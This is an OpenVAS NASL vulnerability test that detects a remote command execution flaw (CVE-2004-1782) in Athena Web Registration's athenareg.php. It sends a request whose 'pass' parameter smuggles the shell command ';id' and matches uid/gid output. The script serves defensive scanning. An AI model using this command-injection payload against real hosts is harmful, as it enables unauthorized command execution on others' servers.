# OpenVAS Vulnerability Test
# $Id: athena_web_remote_cmd_exec.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: Athena Web Registration remote command execution flaw
#
# Authors:
# David Maciejak <david dot maciejak at kyxar dot fr>
#
# Copyright:
# Copyright (C) 2005 David Maciejak
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote host is running Athena Web server.

The remote version of this software is vulnerable to remote command 
execution flaw through the athenareg.php script.

A malicious user could execute arbitrary commands on the remote host.";

tag_solution = "No update currently available, use another web server";

# Ref: Peter Kieser

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.18376");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(9349);
 script_cve_id("CVE-2004-1782");
 script_xref(name:"OSVDB", value:"16861");
  
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 name = "Athena Web Registration remote command execution flaw";
 script_name(name);
 
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 
 script_copyright("This script is Copyright (C) 2005 David Maciejak");
 family = "Web application abuses";
 script_family(family);
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");

 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);


http_check_remote_code (
			check_request:"/athenareg.php?pass=%20;id",
			check_result:"uid=[0-9]+.*gid=[0-9]+.*",
			command:"id",
			port:port
			);
